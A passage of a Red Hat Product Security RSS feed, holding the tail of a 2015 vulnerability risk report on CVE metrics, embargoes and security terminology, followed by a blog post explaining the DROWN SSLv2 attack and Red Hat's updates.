href=\"https://access.redhat.com/security/cve/CVE-2015-0291\">CVE-2015-0291</a> did not affect Red Hat products. A Metasploit module exists for <a href=\"https://access.redhat.com/security/cve/CVE-2015-1793\">CVE-2015-1793</a>.</li>\n<li>Three issues: <a href=\"https://access.redhat.com/security/cve/CVE-2015-0286\">CVE-2015-0286</a>, <a href=\"https://access.redhat.com/security/cve/CVE-2015-3195\">CVE-2015-3195</a>, and <a href=\"https://access.redhat.com/security/cve/CVE-2015-3194\">CVE-2015-3194</a> all had Moderate or Low impact for Red Hat products.</li>\n</ul>\n</li>\n<li>Two flaws in OpenSSH, of which one, <a href=\"https://access.redhat.com/security/cve/CVE-2015-5600\">CVE-2015-5600</a> did not affect Red Hat products in a default configuration and was rated Low impact; <a href=\"https://access.redhat.com/security/cve/CVE-2015-5352\">CVE-2015-5352</a> which affected some versions of Red Hat Enterprise Linux but at Moderate impact.</li>\n<li>Two flaws in the Red Hat Enterprise Linux kernel, both rated Important impact; <a href=\"https://access.redhat.com/security/cve/CVE-2015-1805\">CVE-2015-1805</a> that could allow a local attacker to escalate their privileges to root; <a href=\"https://access.redhat.com/security/cve/CVE-2015-5364\">CVE-2015-5364</a> where a remote attacker who is able to send UDP packages to a listening server could cause it to crash. We are not aware of public exploits for either issue.</li>\n<li>A Moderate rated flaw in the Apache web server <a href=\"https://access.redhat.com/security/cve/CVE-2015-3183\">CVE-2015-3183</a> which could lead to proxy smuggling attacks. We are not aware of a public exploit for this issue.</li>\n</ul>\n<h2>The open source supply chain</h2>\n<p>Red Hat products are based on open source software. Some Red Hat products contain several thousand individual packages, each of which is based on separate, third-party, software from upstream. While Red Hat engineers play a part in many upstream components, handling and managing vulnerabilities across thousands of third-party components is non-trivial.</p>\n<p>Red Hat has a dedicated Product Security team who monitor issues affecting Red Hat products and work closely in relationships with upstream projects. In 2015, more than 2000 vulnerabilities were investigated that potentially affected parts of our products, leading to fixing 1363 vulnerabilities.</p>\n<p>Every one of those 2000+ vulnerabilities is tracked in the Red Hat Bugzilla tool and is publicly accessible. Each vulnerability has a master bug including the CVE name as an alias and a “whiteboard” field which contains a comma separated list of metadata. The metadata we publish includes the dates we found out about the issue, the severity, and the source. We also summarise this in <a href=\"https://www.redhat.com/security/data/metrics/cve_dates.txt\">a file</a> containing all of the information gathered for every CVE, as well as a readable entry in the CVE database in the Red Hat Customer Portal.</p>\n<p>For example, for <a href=\"https://access.redhat.com/security/cve/CVE-2015-0297\">CVE-2015-0297</a> mentioned above:</p>\n<blockquote><p>Bugzilla: <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-0297\">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2015-0297</a></p>\n<p>Whiteboard: impact=critical,public=20150414,reported=20150220,<br />\n  source=customer,cvss2=7.5/AV:N/AC:L/Au:N/C:P/I:P/A:P,<br />\n  cwe=CWE-306,jon-3/Security=affected</p>\n</blockquote>\n<p>This example shows us the issue was reported to Red Hat Product Security by a customer on February 20, 2015, the issue became known to the public on April 14, 2015, and it affected the JBoss Operations Network 3 product. An automated comment in the Bugzilla shows an errata was released to address this on April 21, 2015 as <a href=\"https://rhn.redhat.com/errata/RHSA-2015-0862.html\">RHSA-2015:0862</a>.</p>\n<p>Issues that are not yet public still get an entry in Bugzilla, but they are initially private to Red Hat. Once an issue becomes public, the associated Bugzilla is updated and made public.</p>\n<p>We make use of this data to create metrics and spot trends. One interesting metric is to look at how vulnerabilities are reported to us. We can do this by looking at the whiteboard “source” data to see how we found out about all the issues we fixed in 2015. This is shown on the chart below.</p>\n<p><img src=\"/sites/default/files/riskreport_opensourcesupplychain_final.png?\" alt=\"\" class=\"image-large\" /></p>\n<p>Key:</p>\n<ul>\n<li><strong>Internet:</strong> for issues not disclosed in advance, we monitor a number of mailing lists and security web pages of upstream projects.</li>\n<li><strong>Relationship:</strong> issues reported to us by upstream projects, generally in advance of public disclosure.</li>\n<li><strong>Red Hat:</strong> issues found by Red Hat employees.</li>\n<li><strong>Individual:</strong> issues reported to Red Hat Product Security directly by a customer or researcher.</li>\n<li><strong>Peer vendors:</strong> issues reported to us by other open source distributions, through relationships or <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Foss-security.openwall.org%2Fwiki%2Fmailing-lists%2Fdistros\">a shared private forum</a>.</li>\n<li><strong>CVE:</strong> if we haven’t found out about an issue any other way, we can catch it from the list of public assigned CVE names from Mitre.</li>\n<li><strong>CERT:</strong> issues reported to us from a national Computer Emergency Response Team like CERT/CC or CPNI.</li>\n</ul>\n<p>We can make some observations from this data. First, Red Hat employees find a lot of the vulnerabilities we fix. We don’t take a passive role and wait for others to find flaws for us to fix. We actively look for issues ourselves and these are found by engineering, quality assurance, as well as our security teams. 12% of the issues we fixed in the year were found by Red Hat employees. The issues we find are shared back upstream and if they are risky, under embargo to other peer vendors (generally via the ‘distros’ shared private forum). In addition to those 167 issues, Red Hat also finds and reports flaws in software that isn’t part of a current shipped product or affects other vendors’ software.</p>\n<p>Next, relationships matter. When you are fixing vulnerabilities in third-party software, having a relationship with the upstream community makes a big difference. Red Hat Product Security are often asked how to get notified of issues in open source software in advance, but there is no single place you can go to get notifications. If an upstream is willing to give information about flaws in advance, then you should also be willing to give value back to that notification, making it a two-way street. At Red Hat we do this by sanity checking draft advisories, checking patches, and feeding back the results from our quality testing when there is enough time. A good example of this is the OpenSSL CCS Injection flaw in 2014. Our relationship with OpenSSL gave us advance notice of the issue. We found a mistake in the advisory as well as a mistake in the patch, which otherwise would have caused OpenSSL to have to do a secondary fix after release. Only two of the dozens of companies pre-notified about those OpenSSL vulnerabilities noticed issues and fed back information to upstream.</p>\n<p>Finally, it’s non-trivial to replicate this yourself. If you are an organization that uses open source software that you manage yourself, then you need to ensure you are able to find out about vulnerabilities that affect those components so you can analyse and remediate. Vendors without a sizable dedicated security team have to watch what other vendors do, or rely on other vulnerability feeds such as the list of assigned CVE names from Mitre. Red Hat chooses to invest in a dedicated team handling vulnerability notifications to ensure we find out about issues that affect our products and build upstream relationships.</p>\n<h2>Embargo and release timings</h2>\n<p>Vulnerabilities known to Red Hat in advance of being public are known as being “under embargo”, mirroring the way journalists use the term for stories under a press embargo which are not to be made public until an agreed date and time.</p>\n<p>The component parts that make up Red Hat products are open source, and this means we’re in most cases not the only vendor shipping each particular part. Unlike companies shipping proprietary software, Red Hat therefore is not in sole control of the date each flaw is made public.  This is actually a good thing and leads to much shorter response times between flaws being first reported to being made public.  It also keeps us honest; Red Hat can’t play games to artificially reduce our “days of risk” statistics by using tactics such as holding off public disclosure of meaningful flaws for a long period, or until some regularly scheduled patch day.</p>\n<p>Shorter embargo periods also make flaws much less valuable to attackers; they know a flaw in open source is likely to get fixed quickly, shortening their window of opportunity to exploit it.</p>\n<p>For the issues found by Red Hat, we choose to only embargo the issues that really matter and even then we use embargoes sparingly.  Bringing in additional security experts, who would not normally be aware due to the embargo, rather than just the original researcher and the upstream project, increases the chances of the issue being properly understood and patched the first time around.  For the majority of lower severity issues, attackers have little to no interest in them. By definition, these are issues that lead to minimal consequences even if they are exploitable, so the cost of embargoes is not justified. If we do choose to embargo an issue due to the severity, we share the details with the relevant upstream developers as well as other peer vendors, working together to address the issues.  We talk about this more in our blog post \"<a href=\"https://access.redhat.com/blogs/766093/posts/1976653\">The hidden costs of embargos</a>\".</p>\n<p>For 2015, we knew about 438 (32%) of the vulnerabilities we addressed in advance of them being public.  Across all products and vulnerabilities of all severities known to us in advance, the median embargo was 13 days.</p>\n<p>There are many positives to releasing fixes for issues that matter quickly, but the drawback to not having a regular patch day is that you need to respond to more issues as they happen.  We do help suggest embargo dates that avoid weekends and major holidays, so let’s look how well that works in practice.</p>\n<p><img src=\"/sites/default/files/riskreportgraphics_heatmap_final_v2.png?\" alt=\"\" class=\"image-large\" /></p>\n<p>The chart above shows a heat-map for 2015 with the days and times we push most issues for Critical and Important advisories for all Red Hat products. The more advisories pushed for a given date and hour, the darker that section of the heat-map.</p>\n<p>The most popular times we pushed advisories can be seen as Tuesdays 11 a.m. to 2 p.m. EST and Thursdays 9 a.m. to 3 p.m. EST.  Fridays are pretty light for pushes. There were no Saturday pushes. The only Sunday pushes were ones arranged to arrive first thing Monday morning (these are usually pushed during Monday in India or Europe time zones).</p>\n<h2>Conclusion</h2>\n<p>This report looked at the security risk to users of Red Hat products in 2015 by giving metrics around vulnerabilities, highlighting those that were the most severe, looking at threat, those that were exploited, and showing which were branded or gained media attention.</p>\n<p>There are other types of security risks, such as malware or ransomware, that we haven’t covered in this report. They rely on an attacker having access to a system through an intrusion or by exploiting a vulnerability.</p>\n<p>For the last year of vulnerabilities affecting Red Hat products the issues that matter and the issues that got branded do have an overlap, but they certainly don’t closely match. Just because an issue gets given a name, a logo, or press attention does not mean it’s of increased risk.  We’ve also shown there were some vulnerabilities of increased risk that did not get branded or media attention at all.</p>\n<p>At Red Hat, our dedicated <a href=\"https://access.redhat.com/security/team/\">Product Security team</a> analyses threats and vulnerabilities against all of our products every day, and provide relevant advice and updates through the Red Hat Customer Portal. Customers can call on this expertise to ensure that they respond quickly to address the issues that matter, while avoiding being caught up in a media whirlwind for those that don’t.</p>\n<h2>Appendix: Common security abbreviations and terms</h2>\n<p>Acronyms are used extensively in security standards, so here are some of the more common terms and abbreviations you’ll see used by Red Hat relating to vulnerability handling and errata.  You can find more in <a href=\"https://access.redhat.com/blogs/766093/posts/1976613\">this blog post</a>.</p>\n<h3>CVE:</h3>\n<p>The Common Vulnerabilities and Exposures (CVE) project is a list of standardized names for vulnerabilities and security exposures.</p>\n<p>Since November 2001 Red Hat has used CVE names in security advisories to describe all vulnerabilities affecting Red Hat products.  Red Hat has CVE Editorial Board membership and is a Candidate Naming Authority.  We have a public <a href=\"https://access.redhat.com/articles/2123171\">CVE compatibility page</a> and provide a <a href=\"https://access.redhat.com/security/security-updates/#/cve\">CVE database</a> in the Red Hat Customer Portal.</p>\n<h3>CVRF:</h3>\n<p>The goal of the Common Vulnerability Reporting Framework (CVRF) is to provide a way to share information about security updates in an XML machine-readable format.</p>\n<p>Since 2012, Red Hat has provided CVRF representations of Red Hat Security Advisories, and details can be found <a href=\"https://access.redhat.com/articles/124913\">in this page</a>.</p>\n<h3>OVAL:</h3>\n<p>The Open Vulnerability and Assessment Language (OVAL) project promotes open and publicly available security content, and seeks to standardize the transfer of this information across the entire spectrum of security tools and services.</p>\n<p>Since 2006, Red Hat has been providing machine-readable XML versions of our Red Hat Enterprise Linux security advisories as OVAL definitions. Our OVAL definitions are designed for use by automated test tools to determine the patch state of a machine.</p>\n<p>Red Hat provides OVAL patch definitions for security updates to Red Hat Enterprise Linux 4, 5, 6, and 7. The first OVAL-compatible version was Red Hat Enterprise Linux 3, for which OVAL patch definitions continue to be available for download. For more information read <a href=\"https://access.redhat.com/articles/221883\">this page</a>.</p>\n<h3>RHSA:</h3>\n<p>Since 1999, all Red Hat security updates are accompanied by a security advisory (RHSA).  The advisories are publicly available via the Red Hat Customer Portal as well as other notification methods such as email. These are sometimes also referred to as security errata.  The other advisory types are Red Hat Bugfix Advisory (RHBA) and Red Hat Enhancement Advisory (RHEA).</p>\n<h3>CVSS:</h3>\n<p>Common Vulnerability Scoring System (CVSS) base scores give a detailed severity rating by scoring the constant aspects of a vulnerability: Access Vector, Access Complexity, Authentication, Confidentiality, Integrity, and Availability.</p>\n<p>Since 2009, Red Hat provides CVSS version 2 base metrics for all vulnerabilities affecting Red Hat products. These scores are found on the <a href=\"https://access.redhat.com/security/security-updates/#/cve\">CVE pages</a> (linked to from the References section of each Red Hat Security Advisory) and also from our <a href=\"http://www.redhat.com/security/data/metrics/\">Security Measurements</a> page.</p>\n<p>CVSS scores are not used by Red Hat to determine the priority with which flaws are fixed. It is used as a guideline to identify key metrics of a flaw, but the priority for which flaws are fixed is determined by the overall impact of the flaw using the aforementioned <a href=\"https://access.redhat.com/security/updates/classification\">4 point scale</a>.</p>\n<h3>CWE:</h3>\n<p>Common Weakness Enumeration (CWE) is a dictionary or formal list of common software weaknesses. It is a common language or taxonomy for describing vulnerabilities and weaknesses; a standard measurement for software assurance tools and services’ capabilities; and a base for software vulnerability and weakness identification, mitigation, and prevention.<br />\nThe Red Hat Customer Portal is officially <a href=\"https://access.redhat.com/blogs/766093/posts/1975773\">CWE Compatible</a>.</p>\n<h3>CPE:</h3>\n<p>CPE is a structured naming scheme for information technology systems, software, and packages. For reference, we provide a dictionary mapping the CPE names we use, to Red Hat product descriptions. Some of these CPE names will be for new products that are not in the official CPE dictionary, and should therefore be treated as temporary CPE names.</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2262281\"></div><div class=\"field field-name-field-kcs-a-category-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tCategory\t</h2>\n\n    Secure</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security</div>","pubDate":"Wed, 20 Apr 2016 13:30:00 +0000","dc:creator":"Red Hat Product Security","guid":{"@isPermaLink":"false","#text":"2262281 at https://access.redhat.com"}},{"title":"Go home SSLv2, you’re DROWNing","link":"https://access.redhat.com/blogs/product-security/posts/drown","description":"<div class=\"field field-name-body field-type-text-with-summary field-label-hidden \">\n\n    <p>The SSLv2 protocol had its 21st birthday last month, but it’s no cause to celebrate with an alcohol beverage, since the protocol was already <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Ftools.ietf.org%2Fhtml%2Frfc6176\">deprecated</a> when it turned 18.</p>\n<p>Announced <a href=\"https://access.redhat.com/bounce/?externalURL=https%3A%2F%2Fwww.openssl.org%2Fnews%2Fvulnerabilities.html%23y2016\">today</a> is an attack called DROWN that takes advantage of systems still using SSLv2.</p>\n<p>Many cryptographic libraries already disable SSLv2 by default, and updates from the OpenSSL project and Red Hat today catch up.</p>\n<h2>What is DROWN?</h2>\n<p><a href=\"https://access.redhat.com/security/cve/cve-2016-0800\">CVE-2016-0800</a>, also known as DROWN, stands for <strong>D</strong>ecrypting <strong>R</strong>SA using <strong>O</strong>bsolete and <strong>W</strong>eakened e<strong>N</strong>cryption and is a Man-in-the-Middle (MITM) attack against servers running TLS for secure communications.</p>\n<p>This means that if an attacker can intercept and modify network traffic between a client and the host, the attacker could impersonate the server on what is expected to be a secure connection.  The attacker could then potentially eavesdrop or modify important information as it is transferred between the server and client.</p>\n<p>Other Man-in-the-Middle attacks have included <a href=\"https://access.redhat.com/solutions/1291123\">POODLE</a> and <a href=\"https://access.redhat.com/articles/1369543\">FREAK</a>.  The famous OpenSSL <a href=\"https://access.redhat.com/solutions/781793\">Heartbleed</a> issue from April 2014 did not need a Man-in-the-Middle and was therefore a much more severe risk.</p>\n<h2>How does it work?</h2>\n<p>The DROWN issue is technically complicated, and the ability to attack using it depends on a number of factors described in more detail in the <a href=\"https://access.redhat.com/bounce/?externalURL=http%3A%2F%2Fwww.drownattack.com%2F\">researchers’ whitepaper</a>.  In short, the issue uses a protocol issue in SSLv2 as an oracle in order to help break the encryption on other TLS services if a shared RSA key is in use.  The issue is actually quite tricky to exploit by itself, but made easier on servers that are not up to date with some previous year-old OpenSSL security updates.  They call this “Special DROWN”, as it could allow a real-time Man-in-the-Middle attack.</p>\n<p>Red Hat has a <a href=\"https://access.redhat.com/security/vulnerabilities/drown\">vulnerability article</a> in the Customer Portal which explains the technical attack and the dependencies in more detail.</p>\n<h2>How is Red Hat affected?</h2>\n<p>OpenSSL is affected by this issue.  In Red Hat Enterprise Linux, the cryptographic libraries GnuTLS and NSS are not affected by this issue as they intentionally do not enable SSLv2.</p>\n<p>Customers who are running services that have the SSLv2 protocol enabled could be affected by this issue.</p>\n<p>Red Hat has rated this issue as having <a href=\"https://access.redhat.com/security/updates/classification/\">Important</a> security severity.  A successful attack would need to be able to leverage a number of conditions and require an attacker to be a Man-in-the-Middle.</p>\n<p>Red Hat advises that SSLv2 is a protocol that should no longer be considered safe and should not be used in a modern environment.  Red Hat updates for OpenSSL can be found here: <a href=\"https://access.redhat.com/security/cve/cve-2016-0800\">https://access.redhat.com/security/cve/cve-2016-0800</a>.  The updates cause the SSLv2 protocol to be disabled by default.</p>\n<p>Our OpenSSL updates also include several other lower priority security fixes which are each described in the Errata.  Your organization should review those issues as well when assessing risk.</p>\n<p>If you are a Red Hat Insights customer, a test has been added to identify servers affected by this issue.</p>\n<h2>What do you need to do?</h2>\n<p>If you are unsure of any details surrounding this issue in your environment, you should apply the update and restart services as appropriate.  For detailed technical information please see the Red Hat <a href=\"https://access.redhat.com/security/vulnerabilities/drown\">vulnerability article</a>.</p>\n<p>Security protocols don’t turn 21 every day, so let’s turn off SSLv2, raise a glass, and DROWN one’s sorrows.  Cheers!</p></div><div class=\"form-item form-type-item\">\n  <label>Language </label>\n English\n</div>\n<div id=\"comment-wrapper-nid-2181831\"></div><div class=\"field field-name-field-product field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tProduct\t</h2>\n\n    Red Hat Enterprise Linux</div><div class=\"field field-name-field-kcs-tags-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tTags\t</h2>\n\n    security    ssl</div><div class=\"field field-name-field-kcs-component-select field-type-taxonomy-term-reference field-label-above \">\n\t<h2 class=\"field-label\">\n\t\t\t\tComponent\t</h2>\n\n    openssl</div>","pubDate":"Tue, 01 Mar 2016 13:00:00 +0000","dc:creator":"Mark J. Cox","guid":{"@isPermaLink":"false","#text":"2181831 at https://access.redhat.com"}}]}}}